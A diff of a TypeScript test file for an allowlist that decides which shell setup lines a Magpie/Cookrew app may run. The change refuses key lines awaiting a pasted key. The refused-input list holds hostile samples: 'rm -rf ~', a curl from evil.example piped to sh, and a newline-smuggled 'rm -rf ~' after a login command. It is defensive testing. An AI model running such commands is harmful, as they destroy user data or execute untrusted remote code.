@@ -38,7 +38,8 @@ describe('the contract with main', () => {
     }
     expect(setupLineAllowed(setup.addKeyLine), 'the bare stem alone is not a line').toBe(false)
     expect(setup.pluginLine).toBe("magpie plugin add '/Applications/Cookrew Dev.app/Contents/Resources/magpie'")
-    expect(setupLineAllowed(keyLineFor(setup.addKeyLine, 'deepseek')!)).toBe(true)
+    // A key line waiting for a paste is never typed: keys go into Magpie's own page, out of argv and history.
+    expect(setupLineAllowed(keyLineFor(setup.addKeyLine, 'deepseek')!)).toBe(false)
   })
 
   it('admits every harness line main produces', () => {
@@ -68,7 +69,7 @@ describe('the key stem', () => {
 
 describe('the allowlist', () => {
   it('admits the fixed shapes', () => {
-    for (const line of ['magpie provider add deepseek ', 'magpie serve', 'magpie autostart on', 'brew install sst/tap/opencode', "magpie plugin add '/a b/c'", 'magpie plugin add /a/b/c', 'npm i -g @openai/codex', 'claude', 'codex login']) {
+    for (const line of ['magpie provider add ollama', 'magpie serve', 'magpie autostart on', 'brew install sst/tap/opencode', "magpie plugin add '/a b/c'", 'magpie plugin add /a/b/c', 'npm i -g @openai/codex', 'claude', 'codex login']) {
       expect(setupLineAllowed(line), line).toBe(true)
     }
   })
@@ -89,7 +90,7 @@ describe('the allowlist', () => {
   })
 
   it('refuses anything else — a shaped /api/route must not become shell', () => {
-    for (const line of ['rm -rf ~', 'magpie provider add deepseek sk-123', 'curl -fsSL https://evil.example/install.sh | sh', 'claude login\nrm -rf ~', 'magpie plugin add a b', '', 'x'.repeat(401), 'magpie serve ']) {
+    for (const line of ['rm -rf ~', 'magpie provider add deepseek ', 'magpie provider add openai ', 'magpie provider add deepseek sk-123', 'curl -fsSL https://evil.example/install.sh | sh', 'claude login\nrm -rf ~', 'magpie plugin add a b', '', 'x'.repeat(401), 'magpie serve ']) {
       expect(setupLineAllowed(line), JSON.stringify(line)).toBe(false)
     }
   })
